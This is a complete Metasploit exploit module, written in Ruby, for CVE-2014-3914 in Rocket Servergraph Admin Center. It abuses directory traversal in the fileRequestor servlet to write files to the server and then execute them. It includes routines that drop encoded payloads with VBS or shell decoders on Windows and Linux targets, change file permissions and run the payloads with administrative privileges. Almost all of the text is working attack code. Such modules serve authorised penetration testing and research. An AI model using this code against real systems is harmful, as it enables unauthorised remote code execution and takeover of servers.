##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  include Msf::Exploit::EXE
 
  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Rocket Servergraph Admin Center fileRequestor Remote Code Execution',
      'Description' => %q{
        This module abuses several directory traversal flaws in Rocket Servergraph Admin
        Center for Tivoli Storage Manager. The issues exist in the fileRequestor servlet,
        allowing a remote attacker to write arbitrary files and execute commands with
        administrative privileges. This module has been tested successfully on Rocket
        ServerGraph 1.2 over Windows 2008 R2 64 bits, Windows 7 SP1 32 bits and Ubuntu
        12.04 64 bits.
      },
      'Author'       =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2014-3914'],
          ['ZDI', '14-161'],
          ['ZDI', '14-162'],
          ['BID', '67779']
        ],
      'Privileged'  => true,
      'Platform'    => %w{ linux unix win },
      'Arch'        => [ARCH_X86, ARCH_X86_64, ARCH_CMD],
      'Payload'     =>
        {
          'Space'       => 8192, # it's writing a file, so just a long enough value
          'DisableNops' => true
          #'BadChars'   => (0x80..0xff).to_a.pack("C*") # Doesn't apply
        },
      'Targets'     =>
        [
          [ 'Linux (Native Payload)',
            {
              'Platform' => 'linux',
              'Arch' => ARCH_X86
            }
          ],
          [ 'Linux (CMD Payload)',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD
            }
          ],
          [ 'Windows / VB Script',
            {
              'Platform' => 'win',
              'Arch' => ARCH_X86
            }
          ],
          [ 'Windows CMD',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Oct 30 2013'))
 
    register_options(
      [
        Opt::RPORT(8888)
      ], self.class)
 
    register_advanced_options(
      [
        OptInt.new('TRAVERSAL_DEPTH', [ true, 'Traversal depth to hit the root folder', 20]),
        OptString.new("WINDIR", [ true, 'The Windows Directory name', 'WINDOWS' ]),
        OptString.new("TEMP_DIR", [ false, 'A directory where we can write files' ])
      ], self.class)
 
  end
 
  def check
    os = get_os
 
    if os.nil?
      return Exploit::CheckCode::Safe
    end
 
    Exploit::CheckCode::Appears
  end
 
  def exploit
    os = get_os
 
    if os == 'win' && target.name =~ /Linux/
      fail_with(Failure::BadConfig, "#{peer} - Windows system detected, but Linux target selected")
    elsif os == 'linux' && target.name =~ /Windows/
      fail_with(Failure::BadConfig, "#{peer} - Linux system detected, but Windows target selected")
    elsif os.nil?
      print_warning("#{peer} - Failed to detect remote operating system, trying anyway...")
    end
 
    if target.name =~ /Windows.*VB/
      exploit_windows_vbs
    elsif target.name =~ /Windows.*CMD/
      exploit_windows_cmd
    elsif target.name =~ /Linux.*CMD/
      exploit_linux_cmd
    elsif target.name =~ /Linux.*Native/
      exploit_linux_native
    end
  end
 
  def exploit_windows_vbs
    traversal = "\\.." * traversal_depth
    payload_base64 = Rex::Text.encode_base64(generate_payload_exe)
    temp = temp_dir('win')
    decoder_file_name = "#{rand_text_alpha(4 + rand(3))}.vbs"
    encoded_file_name = "#{rand_text_alpha(4 + rand(3))}.b64"
    exe_file_name = "#{rand_text_alpha(4 + rand(3))}.exe"
 
    print_status("#{peer} - Dropping the encoded payload to filesystem...")
    write_file("#{traversal}#{temp}#{encoded_file_name}", payload_base64)
 
    vbs = generate_decoder_vbs({
      :temp_dir => "C:#{temp}",
      :encoded_file_name => encoded_file_name,
      :exe_file_name => exe_file_name
    })
    print_status("#{peer} - Dropping the VBS decoder to filesystem...")
    write_file("#{traversal}#{temp}#{decoder_file_name}", vbs)
 
    register_files_for_cleanup("C:#{temp}#{decoder_file_name}")
    register_files_for_cleanup("C:#{temp}#{encoded_file_name}")
    register_files_for_cleanup("C:#{temp}#{exe_file_name}")
    print_status("#{peer} - Executing payload...")
    execute("#{traversal}\\#{win_dir}\\System32\\cscript //nologo C:#{temp}#{decoder_file_name}")
  end
 
 
  def exploit_windows_cmd
    traversal = "\\.." * traversal_depth
    execute("#{traversal}\\#{win_dir}\\System32\\cmd.exe /B /C #{payload.encoded}")
  end
 
  def exploit_linux_native
    traversal = "/.." * traversal_depth
    payload_base64 = Rex::Text.encode_base64(generate_payload_exe)
    temp = temp_dir('linux')
    encoded_file_name = "#{rand_text_alpha(4 + rand(3))}.b64"
    decoder_file_name = "#{rand_text_alpha(4 + rand(3))}.sh"
    elf_file_name = "#{rand_text_alpha(4 + rand(3))}.elf"
 
    print_status("#{peer} - Dropping the encoded payload to filesystem...")
    write_file("#{traversal}#{temp}#{encoded_file_name}", payload_base64)
 
    decoder = <<-SH
#!/bin/sh
 
base64 --decode #{temp}#{encoded_file_name} > #{temp}#{elf_file_name}
chmod 777 #{temp}#{elf_file_name}
#{temp}#{elf_file_name}
SH
 
    print_status("#{peer} - Dropping the decoder to filesystem...")
    write_file("#{traversal}#{temp}#{decoder_file_name}", decoder)
 
    register_files_for_cleanup("#{temp}#{decoder_file_name}")
    register_files_for_cleanup("#{temp}#{encoded_file_name}")
    register_files_for_cleanup("#{temp}#{elf_file_name}")
 
    print_status("#{peer} - Giving execution permissions to the decoder...")
    execute("#{traversal}/bin/chmod 777 #{temp}#{decoder_file_name}")
 
    print_status("#{peer} - Executing decoder and payload...")
    execute("#{traversal}/bin/sh #{temp}#{decoder_file_name}")
  end
 
  def exploit_linux_cmd
    temp = temp_dir('linux')
    elf = rand_text_alpha(4 + rand(4))
 
    traversal = "/.." * traversal_depth
    print_status("#{peer} - Dropping payload...")
    write_file("#{traversal}#{temp}#{elf}", payload.encoded)
    register_files_for_cleanup("#{temp}#{elf}")
    print_status("#{peer} - Providing execution permissions...")
    execute("#{traversal}/bin/chmod 777 #{temp}#{elf}")
    print_status("#{peer} - Executing payload...")
    execute("#{traversal}#{temp}#{elf}")
  end
 
  def generate_decoder_vbs(opts = {})
    decoder_path = File.join(Msf::Config.data_directory, "exploits", "cmdstager", "vbs_b64")
 
    f = File.new(decoder_path, "rb")
    decoder = f.read(f.stat.size)
    f.close
 
    decoder.gsub!(/>>decode_stub/, "")
    decoder.gsub!(/^echo /, "")
    decoder.gsub!(/ENCODED/, "#{opts[:temp_dir]}#{opts[:encoded_file_name]}")
    decoder.gsub!(/DECODED/, "#{opts[:temp_dir]}#{opts[:exe_file_name]}")
 
    decoder
  end
 
  def get_os
    os = nil
    path = ""
    hint = rand_text_alpha(3 + rand(4))
 
    res = send_request(20, "writeDataFile", rand_text_alpha(4 + rand(10)), "/#{hint}/#{hint}")
 
    if res && res.code == 200 && res.body =~ /java.io.FileNotFoundException: (.*)\/#{hint}\/#{hint} \(No such file or directory\)/
      path = $1
    elsif res && res.code == 200 && res.body =~ /java.io.FileNotFoundException: (.*)\\#{hint}\\#{hint} \(The system cannot find the path specified\)/
      path = $1
    end
 
    if path =~ /^\//
      os = 'linux'
    elsif path =~ /^[a-zA-Z]:\\/
      os = 'win'
    end
 
    os
  end
 
  def temp_dir(os)
    temp = ""
    case os
    when 'linux'
      temp = linux_temp_dir
    when 'win'
      temp = win_temp_dir
    end
 
    temp
  end
 
  def linux_temp_dir
    dir = "/tmp/"
 
    if datastore['TEMP_DIR'] && !datastore['TEMP_DIR'].empty?
      dir = datastore['TEMP_DIR']
    end
 
    unless dir.start_with?("/")
      dir = "/#{dir}"
    end
 
    unless dir.end_with?("/")
      dir = "#{dir}/"
    end
 
    dir
  end
 
  def win_temp_dir
    dir = "\\#{win_dir}\\Temp\\"
 
    if datastore['TEMP_DIR'] && !datastore['TEMP_DIR'].empty?
      dir = datastore['TEMP_DIR']
    end
 
    dir.gsub!(/\//, "\\")
    dir.gsub!(/^([A-Za-z]:)?/, "")
 
    unless dir.start_with?("\\")
      dir = "\\#{dir}"
    end
 
    unless dir.end_with?("\\")
      dir = "#{dir}\\"
    end
 
    dir
  end
 
  def win_dir
    dir = "WINDOWS"
    if datastore['WINDIR']
      dir = datastore['WINDIR']
      dir.gsub!(/\//, "\\")
      dir.gsub!(/[\\]*$/, "")
      dir.gsub!(/^([A-Za-z]:)?[\\]*/, "")
    end
 
    dir
  end
 
  def traversal_depth
    depth = 20
 
    if datastore['TRAVERSAL_DEPTH'] && datastore['TRAVERSAL_DEPTH'] > 1
      depth = datastore['TRAVERSAL_DEPTH']
    end
 
    depth
  end
 
  def write_file(file_name, contents)
    res = send_request(20, "writeDataFile", Rex::Text.uri_encode(contents), file_name)
 
    unless res && res.code == 200 && res.body.to_s =~ /Data successfully writen to file: /
      fail_with(Failure::Unknown, "#{peer} - Failed to write file... aborting")
    end
 
    res
  end
 
  def execute(command)
    res = send_request(1, "run", command)
 
    res
  end
 
  def send_request(timeout, command, query, source = rand_text_alpha(rand(4) + 4))
    data = "&invoker=#{rand_text_alpha(rand(4) + 4)}"
    data << "&title=#{rand_text_alpha(rand(4) + 4)}"
    data << "&params=#{rand_text_alpha(rand(4) + 4)}"
    data << "&id=#{rand_text_alpha(rand(4) + 4)}"
    data << "&cmd=#{command}"
    data << "&source=#{source}"
    data << "&query=#{query}"
 
    res = send_request_cgi(
      {
        'uri'    => normalize_uri('/', 'SGPAdmin', 'fileRequest'),
        'method' => 'POST',
        'data'   => data
      }, timeout)
 
    res
  end
 
end
